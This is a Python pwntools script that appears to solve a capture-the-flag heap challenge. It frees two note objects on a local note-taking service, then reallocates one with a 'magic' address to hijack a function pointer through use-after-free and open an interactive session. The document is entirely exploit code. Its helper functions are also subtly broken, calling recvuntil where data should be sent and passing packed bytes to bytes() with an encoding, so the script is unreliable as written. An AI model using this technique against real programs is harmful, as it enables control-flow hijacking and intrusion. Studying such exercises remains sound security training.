from pwn import *

host = '127.0.0.1'
port = 8888

r = remote(host, port)

def add_note(size, content):
    r.recvuntil(':')
    r.sendline('1')
    r.recvuntil(':')
    r.recvuntil(bytes(str(size), 'utf-8'))
    r.recvuntil(':')
    r.recvuntil(bytes(content, 'utf-8'))

def del_note(idx):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.recvuntil(bytes(str(idx), 'utf-8'))

def print_note(idx):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.recvuntil(bytes(str(idx), 'utf-8'))

add_note(0x50, 'dada')
add_note(0x50, 'dada')
del_note(0)
del_note(1)
magic = 0x0000000000400c23
add_note(16, p64(magic))
print_note(0)

r.interactive()
